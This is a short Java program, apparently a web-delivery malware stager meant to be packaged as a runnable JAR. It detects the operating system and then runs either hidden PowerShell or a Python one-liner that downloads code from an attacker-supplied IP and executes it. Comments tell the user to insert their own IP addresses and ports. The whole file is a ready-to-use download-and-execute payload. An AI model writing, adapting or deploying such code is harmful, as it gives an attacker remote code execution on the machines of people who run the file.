import java.io.IOException;

public class WebDeliveryExec {
    //DONT FORGET TO CHANGE THE IP ADDRESSES AND PORTS IN THE RUNTIME COMMANDS


    //It is recommended to compile this into a runnable JAR file for best effect
    public static void main(String[] args) throws IOException {

        String os = System.getProperty("os.name"); //get os name for correct payload
        if(os.toLowerCase().contains("windows")){ //checks for windows
            Process p = Runtime.getRuntime().exec(new String[]{"powershell.exe", "-nop", "-w", "hidden", "-c", "$g=new-object", "net.webclient;$g.proxy=[Net.WebRequest]::GetSystemWebProxy();$g.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $g.downloadstring(\'http://REPLACE WITH YOUR IP:8080/\');"});
        }else{ //anything else than windows
            Process p = Runtime.getRuntime().exec(new String[]{"bash","-c","python -c \"import urllib2; r = urllib2.urlopen('http://REPLACE WITH YOUR IP:8081/1'); exec(r.read());\"\n"});
        }
    }
}